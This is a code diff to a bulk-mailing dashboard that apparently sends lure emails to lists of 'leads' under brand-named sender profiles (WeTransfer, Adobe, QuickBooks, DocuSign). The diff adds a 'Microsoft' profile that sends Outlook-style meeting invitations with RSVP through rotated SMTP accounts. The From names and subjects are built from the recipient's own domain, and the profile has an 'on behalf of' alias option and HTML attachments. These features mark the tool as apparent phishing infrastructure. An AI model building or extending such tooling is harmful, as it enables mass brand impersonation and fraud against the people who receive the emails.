@@ -25,7 +25,7 @@ import {
   Zap,
 } from 'lucide-react';
 
-type SenderKey = 'wetransfer' | 'adobe' | 'gmail' | 'smtp' | 'quickbooks' | 'docusign';
+type SenderKey = 'wetransfer' | 'adobe' | 'gmail' | 'smtp' | 'microsoft' | 'quickbooks' | 'docusign';
 type LeadStatus = 'pending' | 'sending' | 'sent' | 'failed' | 'skipped';
 type RunState = 'idle' | 'running' | 'stopped' | 'completed' | 'completed_with_errors' | 'failed';
 type LogLevel = 'info' | 'success' | 'warning' | 'error' | 'stopped' | 'system';
@@ -250,13 +250,14 @@ type WeTransferSendLeadApiResponse = {
   } | null;
 };
 
-const SENDER_KEYS: SenderKey[] = ['wetransfer', 'adobe', 'gmail', 'smtp', 'quickbooks', 'docusign'];
+const SENDER_KEYS: SenderKey[] = ['wetransfer', 'adobe', 'gmail', 'smtp', 'microsoft', 'quickbooks', 'docusign'];
 
 const SENDERS: Array<{ key: SenderKey; label: string }> = [
   { key: 'wetransfer', label: 'WeTransfer' },
   { key: 'adobe', label: 'Adobe Acrobat' },
   { key: 'gmail', label: 'Gmail' },
   { key: 'smtp', label: 'SMTP' },
+  { key: 'microsoft', label: 'Microsoft' },
   { key: 'quickbooks', label: 'QuickBooks' },
   { key: 'docusign', label: 'DocuSign' },
 ];
@@ -455,6 +456,7 @@ function createDefaultSenderConfigs(): Record<SenderKey, SenderConfig> {
     adobe: createDefaultSenderConfig(),
     gmail: createDefaultSenderConfig(),
     smtp: createDefaultSenderConfig(),
+    microsoft: createDefaultSenderConfig(),
     quickbooks: createDefaultSenderConfig(),
     docusign: createDefaultSenderConfig(),
   };
@@ -518,6 +520,9 @@ function normalizeSenderConfigs(value: unknown): Record<SenderKey, SenderConfig>
   return {
     wetransfer: normalizeSenderConfig(parsed.wetransfer),
     adobe: normalizeSenderConfig(parsed.adobe),
+    gmail: normalizeSenderConfig(parsed.gmail),
+    smtp: normalizeSenderConfig(parsed.smtp),
+    microsoft: normalizeSenderConfig(parsed.microsoft),
     quickbooks: normalizeSenderConfig(parsed.quickbooks),
     docusign: normalizeSenderConfig(parsed.docusign),
   };
@@ -2851,10 +2856,22 @@ export default function DashboardPage() {
             />
           ) : activeSender === 'smtp' ? (
             <SmtpSenderPanel
+              senderMode="smtp"
               leadEmails={leads
                 .map((lead) => lead.email || lead.normalized)
                 .filter((email): email is string => Boolean(email))}
               onLog={(level, message) => appendLog(level, message, 'smtp')}
+              onToast={addToast}
+            />
+          ) : activeSender === 'microsoft' ? (
+            <SmtpSenderPanel
+              senderMode="microsoft"
+              leadEmails={leads
+                .map((lead) => lead.email || lead.normalized)
+                .filter((email): email is string => Boolean(email))}
+              onLog={(level, message) =>
+                appendLog(level, message, 'microsoft')
+              }
               onToast={addToast}
             />
           ) : (
@@ -4201,10 +4218,12 @@ type SmtpAccount = {
 };
 
 function SmtpSenderPanel({
+  senderMode = 'smtp',
   leadEmails,
   onLog,
   onToast,
 }: {
+  senderMode?: 'smtp' | 'microsoft';
   leadEmails: string[];
   onLog: (level: LogLevel, message: string) => void;
   onToast: (message: string, level?: LogLevel) => void;
@@ -4249,6 +4268,29 @@ function SmtpSenderPanel({
   const [selectedAccountId, setSelectedAccountId] = React.useState('');
   const [fromName, setFromName] = React.useState('{DomainName}');
   const [replyTo, setReplyTo] = React.useState('');
+
+  const [microsoftMeetingEnabled, setMicrosoftMeetingEnabled] =
+    React.useState(true);
+  const [meetingTitleTemplate, setMeetingTitleTemplate] =
+    React.useState('{DomainName} Meeting Invitation');
+  const [meetingDescriptionTemplate, setMeetingDescriptionTemplate] =
+    React.useState(
+      'You are invited to join our meeting. Please RSVP to confirm your attendance.'
+    );
+  const [meetingLocationTemplate, setMeetingLocationTemplate] =
+    React.useState('{DomainName} Conference Room');
+  const [meetingOrganizerNameTemplate, setMeetingOrganizerNameTemplate] =
+    React.useState('{DomainName} Meetings');
+  const [meetingDurationMinutes, setMeetingDurationMinutes] =
+    React.useState(60);
+  const [meetingReminderMinutes, setMeetingReminderMinutes] =
+    React.useState(15);
+
+  const [onBehalfEnabled, setOnBehalfEnabled] =
+    React.useState(false);
+  const [onBehalfFromEmail, setOnBehalfFromEmail] =
+    React.useState('');
+
   const [recipientsText, setRecipientsText] = React.useState('');
   const [subjectTemplate, setSubjectTemplate] = React.useState(
     'Document for {DomainName}'
@@ -4764,6 +4806,45 @@ function SmtpSenderPanel({
       formData.append('recipients', JSON.stringify(recipients));
       formData.append('fromName', fromName);
       formData.append('replyTo', replyTo.trim());
+
+      formData.append(
+        'microsoftMeetingEnabled',
+        senderMode === 'microsoft' && microsoftMeetingEnabled
+          ? 'true'
+          : 'false'
+      );
+      formData.append('meetingTitleTemplate', meetingTitleTemplate);
+      formData.append(
+        'meetingDescriptionTemplate',
+        meetingDescriptionTemplate
+      );
+      formData.append(
+        'meetingLocationTemplate',
+        meetingLocationTemplate
+      );
+      formData.append(
+        'meetingOrganizerNameTemplate',
+        meetingOrganizerNameTemplate
+      );
+      formData.append(
+        'meetingDurationMinutes',
+        String(meetingDurationMinutes)
+      );
+      formData.append(
+        'meetingReminderMinutes',
+        String(meetingReminderMinutes)
+      );
+      formData.append(
+        'onBehalfEnabled',
+        senderMode === 'microsoft' && onBehalfEnabled
+          ? 'true'
+          : 'false'
+      );
+      formData.append(
+        'onBehalfFromEmail',
+        onBehalfFromEmail.trim()
+      );
+
       formData.append('subjectTemplate', subjectTemplate);
       formData.append(
         'randomizeSubjects',
@@ -4824,14 +4905,21 @@ function SmtpSenderPanel({
         formData.append('attachment', attachment);
       }
 
+      const senderLabel =
+        senderMode === 'microsoft' ? 'Microsoft SMTP' : 'SMTP';
+
       onLog(
         'info',
         rotateAccounts
-          ? `SMTP run started — ${recipients.length} recipient(s), ${plan.length} account(s)`
-          : `SMTP run started — ${recipients.length} recipient(s)`
+          ? `${senderLabel} run started — ${recipients.length} recipient(s), ${plan.length} account(s)`
+          : `${senderLabel} run started — ${recipients.length} recipient(s)`
       );
 
-      const response = await fetch('/api/smtp/send', {
+      const response = await fetch(
+        senderMode === 'microsoft'
+          ? '/api/microsoft/send'
+          : '/api/smtp/send',
+        {
         method: 'POST',
         body: formData,
       });
@@ -4884,7 +4972,7 @@ function SmtpSenderPanel({
                   if (event.success) {
                     onLog(
                       'success',
-                      `${event.index}/${event.total} ✅ Email sent successfully to ${event.recipient}${
+                      `${event.index}/${event.total} ✅ ${senderMode === 'microsoft' ? 'Microsoft meeting email' : 'Email'} sent successfully to ${event.recipient}${
                         event.accountEmail
                           ? ` — via ${event.accountEmail}`
                           : ''
@@ -4893,7 +4981,7 @@ function SmtpSenderPanel({
                   } else {
                     onLog(
                       'error',
-                      `${event.index}/${event.total} ❌ Email failed to ${event.recipient}${
+                      `${event.index}/${event.total} ❌ ${senderMode === 'microsoft' ? 'Microsoft meeting email' : 'Email'} failed to ${event.recipient}${
                         event.accountEmail
                           ? ` — via ${event.accountEmail}`
                           : ''
@@ -5002,7 +5090,7 @@ function SmtpSenderPanel({
                 } else if (event.type === 'complete') {
                   onLog(
                     event.failedCount ? 'warning' : 'success',
-                    `SMTP complete — ${event.sentCount || 0} sent, ${
+                    `${senderMode === 'microsoft' ? 'Microsoft SMTP' : 'SMTP'} complete — ${event.sentCount || 0} sent, ${
                       event.failedCount || 0
                     } failed, ${recipients.length} total`
                   );
@@ -5019,12 +5107,12 @@ function SmtpSenderPanel({
         if (done) break;
       }
 
-      onToast('SMTP run completed', 'success');
+      onToast(senderMode === 'microsoft' ? 'Microsoft SMTP run completed' : 'SMTP run completed', 'success');
     } catch (error) {
       const message =
         error instanceof Error ? error.message : String(error);
 
-      onLog('error', `SMTP send failed: ${message}`);
+      onLog('error', `${senderMode === 'microsoft' ? 'Microsoft SMTP' : 'SMTP'} send failed: ${message}`);
       onToast(message, 'error');
     } finally {
       setSending(false);
@@ -5033,7 +5121,7 @@ function SmtpSenderPanel({
 
   return (
     <div className="grid xl:grid-cols-2 gap-4">
-      <Panel title="Authenticated SMTP Accounts">
+      <Panel title={senderMode === 'microsoft' ? "Microsoft Sender — SMTP Accounts" : "Authenticated SMTP Accounts"}>
         <div className="space-y-3">
           <div className="rounded border border-slate-200 bg-slate-50 p-3 text-xs text-slate-600">
             Add the SMTP credentials supplied by your mail provider. Passwords
@@ -5504,7 +5592,7 @@ function SmtpSenderPanel({
         </div>
       </Panel>
 
-      <Panel title="SMTP Message & Documents">
+      <Panel title={senderMode === 'microsoft' ? "Microsoft Meeting Message & Documents" : "SMTP Message & Documents"}>
         <div className="space-y-3">
           <div className="grid gap-3 sm:grid-cols-2">
             <Field label="From name">
@@ -5533,6 +5621,165 @@ function SmtpSenderPanel({
               />
             </Field>
           </div>
+
+          {senderMode === 'microsoft' && (
+            <div className="space-y-3 rounded border border-blue-200 bg-blue-50/40 p-3">
+              <div>
+                <div className="font-semibold text-blue-900">
+                  Outlook-compatible Meeting / RSVP
+                </div>
+                <div className="mt-1 text-xs leading-5 text-blue-800">
+                  Uses the same authenticated SMTP account, but adds a
+                  standards-based calendar invitation (METHOD:REQUEST) with
+                  RSVP, organiser, location, duration and reminder.
+                </div>
+              </div>
+
+              <label className="flex items-center gap-2">
+                <input
+                  type="checkbox"
+                  checked={microsoftMeetingEnabled}
+                  onChange={(event) =>
+                    setMicrosoftMeetingEnabled(event.target.checked)
+                  }
+                />
+                <span className="font-medium">
+                  Enable meeting / RSVP invitation
+                </span>
+              </label>
+
+              {microsoftMeetingEnabled && (
+                <>
+                  <div className="grid gap-3 sm:grid-cols-2">
+                    <Field label="Meeting title">
+                      <input
+                        className="input"
+                        value={meetingTitleTemplate}
+                        onChange={(event) =>
+                          setMeetingTitleTemplate(event.target.value)
+                        }
+                      />
+                    </Field>
+
+                    <Field label="Organiser display name">
+                      <input
+                        className="input"
+                        value={meetingOrganizerNameTemplate}
+                        onChange={(event) =>
+                          setMeetingOrganizerNameTemplate(
+                            event.target.value
+                          )
+                        }
+                        placeholder="{DomainName} Meetings"
+                      />
+                    </Field>
+                  </div>
+
+                  <Field label="Meeting description">
+                    <textarea
+                      className="input min-h-24"
+                      value={meetingDescriptionTemplate}
+                      onChange={(event) =>
+                        setMeetingDescriptionTemplate(
+                          event.target.value
+                        )
+                      }
+                    />
+                  </Field>
+
+                  <div className="grid gap-3 sm:grid-cols-3">
+                    <Field label="Location">
+                      <input
+                        className="input"
+                        value={meetingLocationTemplate}
+                        onChange={(event) =>
+                          setMeetingLocationTemplate(
+                            event.target.value
+                          )
+                        }
+                      />
+                    </Field>
+
+                    <Field label="Duration (minutes)">
+                      <input
+                        type="number"
+                        min={5}
+                        max={1440}
+                        className="input"
+                        value={meetingDurationMinutes}
+                        onChange={(event) =>
+                          setMeetingDurationMinutes(
+                            Math.min(
+                              1440,
+                              Math.max(
+                                5,
+                                Number(event.target.value || 60)
+                              )
+                            )
+                          )
+                        }
+                      />
+                    </Field>
+
+                    <Field label="Reminder (minutes)">
+                      <input
+                        type="number"
+                        min={0}
+                        max={1440}
+                        className="input"
+                        value={meetingReminderMinutes}
+                        onChange={(event) =>
+                          setMeetingReminderMinutes(
+                            Math.min(
+                              1440,
+                              Math.max(
+                                0,
+                                Number(event.target.value || 15)
+                              )
+                            )
+                          )
+                        }
+                      />
+                    </Field>
+                  </div>
+                </>
+              )}
+
+              <div className="space-y-2 rounded border border-blue-200 bg-white p-3">
+                <label className="flex items-center gap-2">
+                  <input
+                    type="checkbox"
+                    checked={onBehalfEnabled}
+                    onChange={(event) =>
+                      setOnBehalfEnabled(event.target.checked)
+                    }
+                  />
+                  <span className="font-medium">
+                    Send on behalf of an authorised alias
+                  </span>
+                </label>
+
+                {onBehalfEnabled && (
+                  <Field label="Authorised From alias">
+                    <input
+                      type="email"
+                      className="input"
+                      value={onBehalfFromEmail}
+                      onChange={(event) =>
+                        setOnBehalfFromEmail(event.target.value)
+                      }
+                      placeholder="meetings@yourdomain.com"
+                    />
+                    <div className="mt-1 text-xs text-slate-500">
+                      The authenticated SMTP mailbox remains the Sender
+                      header. The alias must be provider-authorised and use
+                      the same domain as the authenticated From account.
+                    </div>
+                  </Field>
+                )}
+              </div>
+            </div>
+          )}
 
           <Field label={`Recipients (${recipients.length})`}>
             <textarea
@@ -5802,7 +6049,7 @@ function SmtpSenderPanel({
               <Field label="Live HTML preview">
                 <div className="overflow-hidden rounded border border-slate-300 bg-white">
                   <iframe
-                    title="SMTP HTML preview"
+                    title={senderMode === 'microsoft' ? "Microsoft HTML preview" : "SMTP HTML preview"}
                     sandbox=""
                     className="h-[320px] w-full bg-white"
                     srcDoc={previewHtml(bodyTemplate)}
@@ -5986,7 +6233,7 @@ function SmtpSenderPanel({
                       >
                         <input
                           type="radio"
-                          name="smtpAttachmentMode"
+                          name={senderMode === 'microsoft' ? "microsoftAttachmentMode" : "smtpAttachmentMode"}
                           checked={attachmentMode === value}
                           onChange={() =>
                             setAttachmentMode(
@@ -6032,7 +6279,7 @@ function SmtpSenderPanel({
                     <Field label="Attachment preview">
                       <div className="overflow-hidden rounded border border-slate-300 bg-white">
                         <iframe
-                          title="SMTP attachment preview"
+                          title={senderMode === 'microsoft' ? "Microsoft attachment preview" : "SMTP attachment preview"}
                           sandbox=""
                           className="h-[320px] w-full bg-white"
                           srcDoc={previewHtml(attachmentHtml)}
@@ -6080,8 +6327,16 @@ function SmtpSenderPanel({
             onClick={() => void sendSmtp()}
           >
             {sending
-              ? `Sending SMTP (${recipients.length})…`
-              : `Send ${recipients.length || ''} via SMTP`}
+              ? `Sending ${
+                  senderMode === 'microsoft'
+                    ? 'Microsoft SMTP'
+                    : 'SMTP'
+                } (${recipients.length})…`
+              : `Send ${recipients.length || ''} via ${
+                  senderMode === 'microsoft'
+                    ? 'Microsoft'
+                    : 'SMTP'
+                }`}
           </button>
         </div>
       </Panel>
@@ -7716,6 +7971,7 @@ function senderColor(sender: SenderKey | 'system') {
   if (sender === 'adobe') return '#F59E0B';
   if (sender === 'quickbooks') return '#34D399';
   if (sender === 'docusign') return '#F472B6';
+  if (sender === 'microsoft') return '#00A4EF';
   return '#A78BFA';
 }
 
